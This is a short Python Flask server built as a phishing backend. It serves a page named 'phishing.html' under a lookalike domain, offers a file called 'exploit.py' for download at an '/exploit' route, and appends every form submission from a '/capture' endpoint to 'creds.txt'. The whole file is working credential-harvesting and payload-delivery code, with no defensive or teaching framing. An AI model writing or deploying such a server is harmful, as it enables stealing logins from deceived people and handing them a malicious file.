from flask import Flask, request, render_template, send_from_directory
import os
import json

# Load config with defaults
try:
    with open('config.json') as f:
        config = json.load(f)
except:
    config = {"port": 80, "ssl": False}

app = Flask(__name__)
creds_file = 'creds.txt'

@app.route('/')
def index():
    return render_template('phishing.html', domain="congratsongradujating.netlify.app")

@app.route('/exploit')
def exploit():
    return send_from_directory('static', 'exploit.py')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.form.to_dict()
    with open(creds_file, 'a') as f:
        f.write(json.dumps(data) + '\n')
    return '', 204

if __name__ == '__main__':
    try:
        app.run(host='0.0.0.0', port=config.get('port', 80))
    except Exception as e:
        print(f"Error starting server: {e}")
        # Fallback to port 8080
        app.run(host='0.0.0.0', port=8080)